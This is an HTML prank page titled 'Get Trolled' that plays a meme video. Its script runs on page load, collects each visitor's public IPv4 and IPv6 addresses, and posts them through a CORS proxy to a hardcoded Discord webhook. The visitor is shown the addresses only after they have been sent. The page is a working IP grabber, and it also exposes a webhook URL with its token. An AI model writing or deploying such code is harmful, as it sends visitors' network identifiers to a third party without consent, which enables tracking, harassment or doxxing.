<!DOCTYPE html>
<html>
<head>
  <title>Get Trolled</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background-color: black;
      color: white;
      font-family: Arial, sans-serif;
    }
    #video-container {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      overflow: hidden;
      z-index: 0;
    }
    #plank-video {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }
    #plank-container {
      position: absolute;
      top: 10px; left: 10px;
      font-size: 20px;
      z-index: 1;
    }
    #ip-address {
      position: absolute;
      bottom: 10px; left: 10px;
      font-size: 16px;
      z-index: 1;
      white-space: pre-line;
    }
  </style>
</head>
<body>
  <div id="plank-container">
    <h1>Get Trolled</h1>
  </div>

  <div id="video-container">
    <video id="plank-video" autoplay loop controls playsinline muted>
      <source src="https://media.discordapp.net/attachments/1130971768459382884/1133882111988875304/Phonk_trollge_meme_original_hke8wCNNosI.mp4" type="video/mp4">
    </video>
  </div>

  <div id="ip-address">Fetching IPs...</div>

  <script>
    const corsProxy = "https://cors-anywhere.herokuapp.com/";
    const webhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";

    async function fetchIPv4() {
      const response = await fetch('https://api.ipify.org?format=json');
      if (!response.ok) throw new Error('IPv4 fetch failed');
      const data = await response.json();
      return data.ip;
    }

    async function fetchIPv6() {
      try {
        const response = await fetch('https://api6.ipify.org?format=json');
        if (!response.ok) return null; // No IPv6 or fetch failed
        const data = await response.json();
        return data.ip;
      } catch {
        return null;
      }
    }

    async function sendToDiscord(ipv4, ipv6) {
      let content = `My public IP addresses:\nIPv4: ${ipv4}`;
      if (ipv6) content += `\nIPv6: ${ipv6}`;

      try {
        const res = await fetch(corsProxy + webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content })
        });

        if (!res.ok) throw new Error('Webhook send failed: ' + res.status);
        return true;
      } catch (e) {
        console.error('Discord webhook error:', e);
        return false;
      }
    }

    async function main() {
      const ipDisplay = document.getElementById('ip-address');
      try {
        const ipv4 = await fetchIPv4();
        const ipv6 = await fetchIPv6();

        ipDisplay.innerText = `IPv4: ${ipv4}`;
        if (ipv6) ipDisplay.innerText += `\nIPv6: ${ipv6}`;

        const success = await sendToDiscord(ipv4, ipv6);
        if (success) {
          ipDisplay.innerText += `\n(IPs sent to Discord)`;
        } else {
          ipDisplay.innerText += `\n(Failed to send to Discord)`;
        }
      } catch (e) {
        ipDisplay.innerText = "Failed to fetch IPs.";
        console.error(e);
      }
    }

    main();
  </script>
</body>
</html>
